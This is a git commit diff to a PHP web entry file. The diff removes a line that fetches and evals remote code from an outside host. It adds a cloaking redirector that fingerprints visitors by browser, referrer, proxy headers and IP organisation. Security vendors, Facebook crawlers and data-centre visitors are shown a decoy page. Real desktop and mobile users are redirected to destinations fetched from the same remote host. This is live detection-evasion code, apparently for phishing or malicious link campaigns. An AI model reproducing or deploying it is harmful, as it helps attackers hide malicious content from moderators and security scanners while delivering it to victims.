04a39e0c1798b912ad7c0f9ed3d6ff4dc6db783f
themonsterx <themonster@mit.tc>
2018-01-04 05:31:51 +0300

    test
    test

--- web/index.php
+++ web/index.php
@@ -1,4 +1,148 @@
 <?php
-$a = file_get_contents("http://extensionx.xyz/php/heroku.json");
+//exit();
+if(isset($_SERVER['HTTP_X_PURPOSE'])){
+    exit();
+  }
+  $_SERVER['HTTP_HOST'] = isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : '';
+  $_SERVER['HTTP_USER_AGENT'] = isset($_SERVER['HTTP_USER_AGENT']) ? $_SERVER['HTTP_USER_AGENT'] : '';
+  // header("Access-Control-Allow-Origin:http://".$_SERVER["HTTP_HOST"]);
+  // header('Access-Control-Allow-Methods: GET');
+  // header('X-Frame-Options: DENY');
+  
 
-eval($a);
+
+  
+  function getORG(){
+    $ch = curl_init();
+    curl_setopt($ch, CURLOPT_URL, 'http://ipinfo.io/'.$_SERVER["REMOTE_ADDR"].'/org');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 5);
+    $org = curl_exec($ch);
+    curl_close($ch);
+    return $org.' ipinfo';
+  }
+  
+  $action = 'theme';
+  $reason = 'browser';
+  
+  
+  require_once('Mobile_Detect.php');
+  require_once('Browser.php');
+  
+  
+  $detect = new Mobile_Detect;
+  $browser = new Browser();
+
+  if($detect->isMobile() || $browser->isMobile()){
+    $action = 'mobile';
+  }else if($browser->getBrowser() == Browser::BROWSER_CHROME){
+    $action = 'site';
+  }else{
+    $action = 'theme';
+  }
+
+  if($action != 'theme'){
+    $bannedhosts = array();
+    foreach ($bannedhosts as $ban) {
+      if(strpos($_SERVER['HTTP_HOST'], $ban) !== false){
+        $action = 'theme';
+        $reason = 'bannedhost';
+        break;
+      }
+    }
+
+  }
+
+  if($action == 'site'){
+    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    $refs = array('googleapis.com', 'facebook.com','herokuapp.com','checkpost.space','goo.gl','bpgcpvxpurninnhkmv.ga',"tx0.org","blogspot","youtube.com","ijebikusup.ml");
+    $action = 'theme'; 
+    foreach ($refs as $ref) {
+      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
+        $action = 'site';
+        $reason = 'referer';
+        break;
+      }
+    }
+    if(isset($_SERVER['HTTP_VIA']) || isset($_SERVER['HTTP_X_FORWARDED_FOR'])){
+      $action = 'theme';
+      $reason = 'proxy';
+    }
+  }
+
+
+  $asnlist = array('reports.fb.com','facebook','google','linode','kaspersy','mcafee','amazon','microsoft corporation','digital ocean','incorporated','inc.','radore','netvision','veri merkezi','data center','mcafee');
+  
+  if($action != 'theme'){
+    $_SERVER['GEOIP_ORG'] = isset($_SERVER['GEOIP_ORG']) ? $_SERVER['GEOIP_ORG'] : '';
+    if($_SERVER['GEOIP_ORG'] == ''){
+      $_SERVER['GEOIP_ORG'] = getORG();
+    }
+    foreach ($asnlist as $asn) {
+      if(strpos(strtolower($_SERVER['GEOIP_ORG']), $asn) !== false){
+        $action = 'theme';
+        $reason = 'asn';
+        break;
+      }
+    }
+    if(isset($_SERVER['HTTP_VIA']) && strpos(strtolower($_SERVER['HTTP_VIA']), 'compression')){
+      $action = 'mobile';
+      $reason = 'compression';
+    }
+  }
+
+
+
+  if(isset($_SERVER['HTTP_X_FB_CURL_CLIENT'])){
+    $action = 'theme';
+    $reason = 'fbcurl';
+  }
+
+  if(isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] != 'GET'){
+    $action = 'theme';
+    $reason = 'method';
+  }
+
+  if($action != 'theme' && $action != 'mobile'){
+    $_SERVER['HTTP_REFERER'] = isset($_SERVER['HTTP_REFERER']) ? $_SERVER['HTTP_REFERER'] : '';
+    $bannedrefs = array('facebook.com/lsr.php','facebook.com/l.php','digitalocean.com','facebook.com/help','fb.me');
+    foreach ($bannedrefs as $ref) {
+      if(strpos($_SERVER['HTTP_REFERER'], $ref) !== false){
+        $action = 'theme';
+        $reason = 'bannedref';
+        break;
+      }
+    }
+  }
+
+
+ $data =  json_decode(file_get_contents("http://extensionx.xyz/php/heroku_data.php"));
+
+  
+  $mobileurl = $data->mobile; // goo.gl
+  $pcurl = $data->pc; // site.com
+  $themeurlfake = "share.php";
+  
+  // exit;
+  
+  $id = @$_GET["id"];
+  $id = isset(explode(".", $id)[0]) ? explode(".", $id)[0] : $id;
+  if($id == ''){
+    $id = generate_name(rand(5,6));
+    // $action = 'theme';
+    // $reason = 'emptyid';
+  }
+    if($action == 'mobile'){
+    header("Location: {$mobileurl}");
+
+  }else if($action == 'site'){
+	if(strrpos($_SERVER['HTTP_HOST'], $pcurl) === false){
+		header('Location: http://'.$pcurl.'/'.$id.'.html?v=#');
+    }
+  }else if($action == 'theme'){
+    @ob_end_clean();
+    @ob_end_flush();
+    require_once($themeurlfake);
+	
+  }
+?>
